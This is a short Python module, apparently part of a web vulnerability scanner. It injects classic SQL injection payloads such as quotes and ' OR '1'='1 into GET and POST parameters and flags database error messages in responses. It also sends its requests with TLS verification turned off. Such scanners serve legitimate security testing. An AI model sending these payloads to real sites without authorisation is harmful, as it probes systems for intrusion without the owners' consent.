import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re

SQL_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
    "'--",
    "') OR ('1'='1"
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sqlstate[hy000]",
    "pg_query()",
    "sql syntax",
]


def _send_get(url):
    return requests.get(url, timeout=5, verify=False)


def _send_post(url, data):
    return requests.post(url, data=data, timeout=5, verify=False)


def check_sqli(url, params, method="GET"):
    findings = []

    for param in params:
        for payload in SQL_PAYLOADS:
            try:
                if method.upper() == "GET":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    if param not in qs:
                        continue
                    qs[param] = [qs[param][0] + payload]
                    new_query = urlencode(qs, doseq=True)
                    new_url = urlunparse(parsed._replace(query=new_query))
                    resp = _send_get(new_url)
                else:
                    # POST
                    data = {p: "test" for p in params}
                    data[param] = data[param] + payload if data.get(param) else payload
                    resp = _send_post(url, data)

                body = resp.text.lower()
                if any(err in body for err in SQL_ERRORS):
                    findings.append({
                        "type": "SQL Injection",
                        "url": url,
                        "attack_url": new_url if method.upper() == "GET" else url,
                        "param": param,
                        "payload": payload,
                        "evidence": "Database error message detected in response.",
                        "severity": "High"
                    })
                    break  # no need to try more payloads for this param
            except Exception:
                continue

    return findings
